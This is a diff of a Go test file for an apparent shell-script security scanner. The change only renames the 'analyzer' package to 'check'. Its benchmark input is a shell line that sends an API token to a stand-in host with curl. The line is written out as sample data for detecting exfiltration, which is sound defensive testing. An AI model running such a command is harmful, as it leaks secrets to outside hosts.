@@ -7,7 +7,7 @@ import (
 	"strings"
 	"testing"
 
-	"github.com/skarm/scout/internal/analysis/analyzer"
+	"github.com/skarm/scout/internal/analysis/check"
 	"github.com/skarm/scout/internal/analysis/document"
 	"github.com/skarm/scout/internal/analysis/languages/shell"
 	"github.com/skarm/scout/internal/capture/artifact"
@@ -373,7 +373,7 @@ func TestShellFlowBudgetsRetainPrefix(t *testing.T) {
 func BenchmarkShellChecks(b *testing.B) {
 	text := strings.Repeat("v=\"$EXAMPLE_API_TOKEN\"; curl --data \"$v\" https://example.invalid\n", 32)
 	doc := document.Prepare(context.Background(), artifact.NewFile("benchmark.sh", []byte(text), false))
-	var checks []analyzer.Analyzer
+	var checks []check.Analyzer
 	for _, a := range shell.Rules() {
 		if strings.HasPrefix(a.Rule().ID, "SH") {
 			checks = append(checks, a)
@@ -391,7 +391,7 @@ func BenchmarkShellChecks(b *testing.B) {
 	}
 }
 
-func shellResult(t testing.TB, rule, text string, limit int) analyzer.Result {
+func shellResult(t testing.TB, rule, text string, limit int) check.Result {
 	t.Helper()
 	for _, a := range shell.Rules() {
 		if a.Rule().ID == rule {
@@ -403,5 +403,5 @@ func shellResult(t testing.TB, rule, text string, limit int) analyzer.Result {
 		}
 	}
 	t.Fatal("missing shell analyzer")
-	return analyzer.Result{}
+	return check.Result{}
 }
